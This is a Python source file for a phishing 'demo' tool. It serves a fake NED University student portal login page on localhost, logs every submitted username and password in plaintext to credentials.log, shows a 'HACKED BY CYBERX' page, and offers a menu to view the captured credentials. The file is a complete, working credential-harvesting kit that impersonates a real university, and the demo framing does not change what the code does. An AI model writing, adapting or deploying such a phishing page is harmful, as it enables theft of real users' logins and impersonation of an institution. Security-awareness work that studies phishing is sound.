#!/usr/bin/env python3

import os
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import threading

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            try:
                with open('templates/index.html', 'r') as f:
                    content = f.read()
            except FileNotFoundError:
                # Fallback if file doesn't exist
                content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NED University Student Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #0f0;
            overflow: hidden;
            position: relative;
        }

        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .grid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 0, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 0, 0.1) 1px, transparent 1px);
            background-size: 30px 30px;
            animation: grid-move 10s linear infinite;
        }

        @keyframes grid-move {
            0% {transform: translate(0, 0);}
            100% {transform: translate(30px, 30px);}
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-box {
            background-color: rgba(0, 20, 0, 0.8);
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            max-width: 400px;
            width: 100%;
            text-align: center;
            position: relative;
            backdrop-filter: blur(5px);
        }

        .login-box h1 {
            color: #0f0;
            margin-bottom: 10px;
            font-size: 24px;
            text-shadow: 0 0 10px #0f0;
        }

        .login-box h2 {
            color: #0f0;
            margin-bottom: 20px;
            font-size: 18px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #0f0;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            background-color: rgba(0, 30, 0, 0.7);
            border: 1px solid #0f0;
            border-radius: 3px;
            color: #0f0;
            font-family: 'Courier New', monospace;
        }

        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
        }

        .login-btn {
            background-color: #002200;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 12px 30px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }

        .login-btn:hover {
            background-color: #004400;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
        }
    </style>
</head>
<body>
    <div class="background">
        <div class="grid"></div>
    </div>
    <div class="container">
        <div class="login-box">
            <h1>NED University</h1>
            <h2>Student Information Portal</h2>
            <h2>Created By : Muhammad Araiz, Muhammad Shuja, Muhammad Ahmed ( MSA )
            <form method="POST" action="/login">
                <div class="input-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Login</button>
            </form>
        </div>
    </div>
</body>
</html>'''
            self.wfile.write(content.encode())
        elif self.path == '/static/style.css':
            self.send_response(200)
            self.send_header('Content-type', 'text/css')
            self.end_headers()
            try:
                with open('static/style.css', 'r') as f:
                    content = f.read()
            except FileNotFoundError:
                # Fallback CSS
                content = '''* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Courier New', monospace;
    background-color: #000;
    color: #0f0;
    overflow: hidden;
    position: relative;
}

.background {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
}

.grid {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: 
        linear-gradient(rgba(0, 255, 0, 0.1) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 255, 0, 0.1) 1px, transparent 1px);
    background-size: 30px 30px;
    animation: grid-move 10s linear infinite;
}

@keyframes grid-move {
    0% {transform: translate(0, 0);}
    100% {transform: translate(30px, 30px);}
}

.container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
}

.login-box {
    background-color: rgba(0, 20, 0, 0.8);
    border: 1px solid #0f0;
    border-radius: 5px;
    padding: 30px;
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
    max-width: 400px;
    width: 100%;
    text-align: center;
    position: relative;
    backdrop-filter: blur(5px);
}

.login-box h1 {
    color: #0f0;
    margin-bottom: 10px;
    font-size: 24px;
    text-shadow: 0 0 10px #0f0;
}

.login-box h2 {
    color: #0f0;
    margin-bottom: 20px;
    font-size: 18px;
}

.input-group {
    margin-bottom: 20px;
    text-align: left;
}

.input-group label {
    display: block;
    margin-bottom: 5px;
    color: #0f0;
}

.input-group input {
    width: 100%;
    padding: 10px;
    background-color: rgba(0, 30, 0, 0.7);
    border: 1px solid #0f0;
    border-radius: 3px;
    color: #0f0;
    font-family: 'Courier New', monospace;
}

.input-group input:focus {
    outline: none;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
}

.login-btn {
    background-color: #002200;
    color: #0f0;
    border: 1px solid #0f0;
    padding: 12px 30px;
    font-size: 16px;
    cursor: pointer;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
    transition: all 0.3s;
}

.login-btn:hover {
    background-color: #004400;
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
}'''
            self.wfile.write(content.encode())
        elif self.path == '/static/script.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            try:
                with open('static/script.js', 'r') as f:
                    content = f.read()
            except FileNotFoundError:
                # Fallback JS
                content = '''document.addEventListener('DOMContentLoaded', function() {
    const headings = document.querySelectorAll('h1, h2');
    headings.forEach(heading => {
        const text = heading.textContent;
        heading.textContent = '';
        let i = 0;
        const typeWriter = () => {
            if (i < text.length) {
                heading.textContent += text.charAt(i);
                i++;
                setTimeout(typeWriter, 100);
            }
        };
        setTimeout(typeWriter, 500);
    });
});'''
            self.wfile.write(content.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            credentials = parse_qs(post_data)
            
            username = credentials.get('username', [''])[0]
            password = credentials.get('password', [''])[0]
            
            # Save credentials to log file
            with open('credentials.log', 'a') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] Username: {username}, Password: {password}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            try:
                with open('templates/success.html', 'r') as f:
                    content = f.read()
            except FileNotFoundError:
                # Fallback success page
                content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Compromised</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #0f0;
            overflow: hidden;
            position: relative;
        }

        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .matrix-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><text x="0" y="15" fill="%2300ff00" font-size="15" opacity="0.1">1</text></svg>');
            animation: matrix-fall 5s linear infinite;
        }

        @keyframes matrix-fall {
            0% {transform: translateY(-100%);}
            100% {transform: translateY(100%);}
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .success-box {
            background-color: rgba(0, 20, 0, 0.8);
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            max-width: 400px;
            width: 100%;
            text-align: center;
            position: relative;
            backdrop-filter: blur(5px);
        }

        .success-box h1 {
            color: #0f0;
            margin-bottom: 20px;
            font-size: 24px;
            text-shadow: 0 0 10px #0f0;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% {opacity: 1;}
            50% {opacity: 0.5;}
        }

        .warning-icon {
            font-size: 60px;
            margin: 20px 0;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% {transform: scale(1);}
            50% {transform: scale(1.2);}
            100% {transform: scale(1);}
        }

        .success-box h2 {
            color: #0f0;
            margin: 20px 0;
            font-size: 18px;
        }

        .success-box p {
            margin: 10px 0;
            line-height: 1.6;
        }

        .cyber-team {
            margin-top: 20px;
            font-weight: bold;
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
        }
    </style>
</head>
<body>
    <div class="background">
        <div class="matrix-effect"></div>
    </div>
    <div class="container">
        <div class="success-box">
            <h1>HACKED BY CYBERX</h1>
            <div class="warning-icon">⚠️</div>
            <h2>You are hacked!!!</h2>
            <p>Account compromised by an unauthorized person.</p>
            <p>Immediately contact the IT Support Team.</p>
            <div class="cyber-team">— CyberX Security Team</div>
        </div>
    </div>
</body>
</html>'''
            self.wfile.write(content.encode())

def start_server():
    port = 8080
    server = HTTPServer(('localhost', port), PhishingHandler)
    print(f"\n[+] Phishing server started on http://localhost:{port}")
    print("[+] Press Ctrl+C to stop the server\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Stopping server...")
        server.shutdown()

def view_credentials():
    if not os.path.exists('credentials.log'):
        print("\n[!] No credentials captured yet.")
        return
    
    print("\n=== CAPTURED CREDENTIALS ===")
    with open('credentials.log', 'r') as f:
        content = f.read()
        if content.strip():
            print(content)
        else:
            print("[!] No credentials captured yet.")

def main():
    # Ensure required directories exist
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    while True:
        print("\n===== CYBERX PHISHING DEMO =====")
        print("1. Start phishing server")
        print("2. View credential log")
        print("3. Exit")
        
        choice = input("\nEnter your choice (1-3): ").strip()
        
        if choice == '1':
            # Start server in a separate thread so we can still use the menu
            server_thread = threading.Thread(target=start_server)
            server_thread.daemon = True
            server_thread.start()
            
            # Keep main thread alive
            try:
                while True:
                    pass
            except KeyboardInterrupt:
                print("\n[-] Server stopped.")
                
        elif choice == '2':
            view_credentials()
        elif choice == '3':
            print("\n[+] Exiting CyberX. Goodbye!")
            sys.exit(0)
        else:
            print("\n[!] Invalid choice. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    main()
